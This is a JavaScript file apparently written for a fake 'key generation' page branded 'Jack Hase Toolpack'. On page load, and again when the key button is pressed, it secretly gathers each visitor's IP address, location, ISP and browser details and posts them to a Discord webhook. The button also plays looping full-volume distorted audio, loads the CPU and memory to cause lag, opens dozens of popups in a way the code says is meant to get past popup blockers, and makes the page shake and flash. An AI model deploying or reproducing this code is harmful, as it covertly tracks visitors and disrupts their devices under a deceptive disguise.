// IP Logger functionality
async function logUserInfo() {
    const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE';
    
    try {
        // Get user IP and location data
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        // Get browser info
        const userAgent = navigator.userAgent;
        const timestamp = new Date().toISOString();
        
        // Prepare log data
        const logData = {
            embeds: [{
                title: "🔑 Key Generation Attempt",
                color: 0xff6b6b,
                fields: [
                    { name: "IP Address", value: ipData.ip || "Unknown", inline: true },
                    { name: "Country", value: ipData.country_name || "Unknown", inline: true },
                    { name: "City", value: ipData.city || "Unknown", inline: true },
                    { name: "ISP", value: ipData.org || "Unknown", inline: false },
                    { name: "User Agent", value: userAgent.substring(0, 1000), inline: false },
                    { name: "Timestamp", value: timestamp, inline: true }
                ],
                footer: { text: "Jack Hase Toolpack Logger" }
            }]
        };
        
        // Send to webhook
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(logData)
        });
    } catch (error) {
        console.error('Logging failed:', error);
    }
}

// Chaos function - opens multiple windows with lag and audio
function generateKey() {
    // Log user info first
    logUserInfo();
    
    // Play earrape audio
    const audio = new Audio('earrape.mp3');
    audio.volume = 1.0;
    audio.loop = true;
    audio.play().catch(e => console.log('Audio play failed:', e));
    
    // Create lag with intensive operations
    const lagInterval = setInterval(() => {
        // CPU intensive operations to cause lag
        for (let i = 0; i < 1000000; i++) {
            Math.random() * Math.random();
        }
        
        // Memory intensive operations
        const heavyArray = new Array(100000).fill(Math.random());
        heavyArray.sort();
    }, 1);
    
    // Open multiple windows rapidly
    let windowCount = 0;
    const maxWindows = 50;
    
    const windowSpam = setInterval(() => {
        if (windowCount >= maxWindows) {
            clearInterval(windowSpam);
            clearInterval(lagInterval);
            return;
        }
        
        try {
            // Open multiple windows with different URLs to bypass popup blockers
            const urls = [
                'about:blank',
                'data:text/html,<h1>Jack Hase Toolpack</h1>',
                'javascript:void(0)',
                ''
            ];
            
            for (let i = 0; i < 5; i++) {
                const randomUrl = urls[Math.floor(Math.random() * urls.length)];
                window.open(randomUrl, '_blank', 'width=400,height=300,scrollbars=yes,resizable=yes');
                windowCount++;
            }
        } catch (e) {
            console.log('Window opening blocked:', e);
        }
    }, 100);
    
    // Add visual chaos to the page
    document.body.style.animation = 'shake 0.1s infinite';
    
    // Change colors rapidly
    let colorIndex = 0;
    const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
    setInterval(() => {
        document.body.style.background = colors[colorIndex % colors.length];
        colorIndex++;
    }, 100);
    
    // Add shake animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
    `;
    document.head.appendChild(style);
}

// Initialize IP logging on page load
window.addEventListener('load', () => {
    logUserInfo();
});

